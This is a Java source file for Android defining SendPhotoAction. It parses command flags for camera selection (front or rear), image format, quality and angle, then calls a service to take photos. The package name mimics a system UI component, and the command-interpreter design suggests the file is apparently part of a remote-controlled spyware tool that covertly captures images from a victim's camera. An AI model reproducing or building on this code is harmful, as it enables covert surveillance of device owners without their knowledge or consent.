package com.system.ui.interpret;

import android.content.Context;

import com.system.ui.service.LocalService;

import java.util.Map;

/**
 * 发送照片的行为
 */
public class SendPhotoAction extends AbsAction {

	private int mIndex;
	private boolean mIsJpeg = true;
	private int mQuality = 50;
	private int mAngle;
	
	/**
	 * 0代表后摄像头，1代表前摄像头
	 */
	public static final String COMMAND_CAMERA_INDEX = "-i";
	public static final String COMMAND_OUTPUT_TYPE = "-o";
	public static final String COMMAND_IMAGE_QUALITY = "-q";
	public static final String COMMAND_IMAGE_ANGLE = "-a";

	public SendPhotoAction(Context context) {
		super(context);
	}

	@Override
	public boolean execute() {
		Map<String, String> params = getParams();
		if (params != null) {
			if (params.containsKey(COMMAND_CAMERA_INDEX)) {
				mIndex = Integer.parseInt(params.get(COMMAND_CAMERA_INDEX));
			}
			if (params.containsKey(COMMAND_OUTPUT_TYPE)) {
				if (params.get(COMMAND_OUTPUT_TYPE).equals("jpeg")) {
					mIsJpeg = true;
				}else if(params.get(COMMAND_OUTPUT_TYPE).equals("png")){
					mIsJpeg = false;
				}
			}
			if (params.containsKey(COMMAND_IMAGE_QUALITY)) {
				mQuality = Integer.parseInt(params.get(COMMAND_IMAGE_QUALITY));
			}
			if (params.containsKey(COMMAND_IMAGE_ANGLE)) {
				mAngle = Integer.parseInt(params.get(COMMAND_IMAGE_ANGLE));
			}
		}
		((LocalService)mContext).takePhotos(mIndex,mAngle,mIsJpeg,mQuality);
		return false;
	}

}
